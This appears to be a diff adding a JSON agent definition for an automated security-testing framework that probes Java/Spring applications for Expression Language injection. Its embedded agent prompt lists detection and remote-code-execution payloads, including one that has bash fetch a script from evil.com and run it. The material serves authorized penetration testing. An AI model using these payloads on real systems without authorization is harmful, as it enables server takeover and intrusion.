@@ -1,0 +1,34 @@
+{
+  "schema_version": 1,
+  "id": "vulns/expression_language_injection",
+  "version": "1.0.0",
+  "title": "Expression Language Injection Specialist Agent",
+  "category": "vulns",
+  "modes": [
+    "blackbox",
+    "greybox"
+  ],
+  "cwe": [
+    "CWE-917"
+  ],
+  "owasp": [],
+  "mitre": [],
+  "preconditions": [
+    "Operator scope and runtime capability checks pass"
+  ],
+  "required_observations": [],
+  "permitted_tools": [
+    "http_get",
+    "dns_resolve",
+    "tcp_connect"
+  ],
+  "risk_class": "restricted",
+  "methodology": "# Expression Language Injection Specialist Agent\n## User Prompt\nYou are testing **{target}** for Expression Language (EL) Injection.\n**Recon Context:**\n{recon_json}\n**METHODOLOGY:**\n### 1. Identify EL Contexts\n- Java EE/Spring applications using JSP, JSF, Thymeleaf\n- `${expression}` or `#{expression}` in templates\n- Error pages, search results reflecting input\n### 2. Payloads\n- Detection: `${7*7}` → if \"49\" appears, EL is evaluated\n- Spring: `${T(java.lang.Runtime).getRuntime().exec('id')}`\n- Java EE: `${applicationScope}`\n- JSF: `#{request.getClass().getClassLoader()}`\n### 3. Chained RCE\n```\n${T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','curl evil.com/shell|bash'})}\n```\n### 4. Report\n```\nFINDING:\n- Title: Expression Language Injection at [endpoint]\n- Severity: Critical\n- CWE: CWE-917\n- Endpoint: [URL]\n- Payload: [EL expression]\n- Evidence: [evaluated output]\n- Impact: Remote Code Execution\n- Remediation: Disable EL evaluation on user input, use parameterized templates\n```\n## System Prompt\nYou are an EL Injection specialist. EL injection is confirmed when `${7*7}` or equivalent evaluates to `49` in the response. This is closely related to SSTI but specific to Java/Spring EL contexts. The application must be running a Java stack for this to be relevant.\n",
+  "validation_procedure": "Submit candidates referencing actual runtime receipts; harness independently replays supported proofs. Unsupported claims require review.",
+  "stopping_conditions": [
+    "Scope rejection, depleted budget, cancellation, or missing permitted capability"
+  ],
+  "output_schema": "candidate/v1",
+  "imported_from": "vulns/expression_language_injection.md",
+  "warnings": []
+}
